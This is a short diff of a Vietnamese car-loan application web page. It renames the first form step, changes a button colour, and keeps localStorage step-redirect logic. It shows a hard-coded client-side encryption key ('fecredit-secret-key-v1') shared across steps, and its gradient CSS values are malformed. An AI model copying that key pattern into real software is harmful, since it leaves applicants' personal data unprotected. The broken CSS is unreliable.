@@ -61,7 +61,7 @@
         .invalid-feedback { font-size: 12px; margin-top: 5px; }
         
         /* Buttons */
-        .btn-next { width: 100%; margin-top: 30px; background: linear-gradient(135deg, #f39423%, #f39423100%); border: none; padding: 16px; font-weight: 700; font-size: 16px; letter-spacing: 0.5px; border-radius: 12px; }
+        .btn-next { width: 100%; margin-top: 30px; background: linear-gradient(135deg, #fdb814%, #fdb814100%); border: none; padding: 16px; font-weight: 700; font-size: 16px; letter-spacing: 0.5px; border-radius: 12px; }
         .btn-next:disabled { background: #ccc; cursor: not-allowed; opacity: 0.7; }
         .btn-next:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 153, 79, 0.3); }
 
@@ -250,7 +250,7 @@
         // =====================================================================
         (function checkNavigationLogic() {
             const APPLICATION_STATUS_COMPLETED = 'completed';
-            const VALID_STEPS = ['step1.html', 'step2.html', 'step3.html', 'step4.html', 'step5.html', 'step6.html', 'step7.html', 'step8.html'];
+            const VALID_STEPS = ['vay-mua-xe-dang-ky.html', 'step2.html', 'step3.html', 'step4.html', 'step5.html', 'step6.html', 'step7.html', 'step8.html'];
             
             const applicationStatus = localStorage.getItem('applicationStatus');
             const currentStep = localStorage.getItem('currentStep');
@@ -262,7 +262,7 @@ if (applicationStatus === APPLICATION_STATUS_COMPLETED) {
             }
             
             // Trường hợp 2: Đang làm dở - chuyển hướng về bước đã lưu
-            if (currentStep && currentStep !== 'step1.html') {
+            if (currentStep && currentStep !== 'vay-mua-xe-dang-ky.html') {
                 // Validate that currentStep is a valid step file (security check)
                 if (VALID_STEPS.includes(currentStep)) {
                     // Chuyển hướng về bước đã lưu
@@ -276,7 +276,7 @@ if (applicationStatus === APPLICATION_STATUS_COMPLETED) {
         // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
         // =====================================================================
         // Lưu vị trí hiện tại sau khi đã kiểm tra điều hướng
-        localStorage.setItem('currentStep', 'step1.html');
+        localStorage.setItem('currentStep', 'vay-mua-xe-dang-ky.html');
 
         // --- 1. UTILITIES (From step1cu.html) ---
         const SECRET_KEY = 'fecredit-secret-key-v1'; // Unified encryption key across all steps
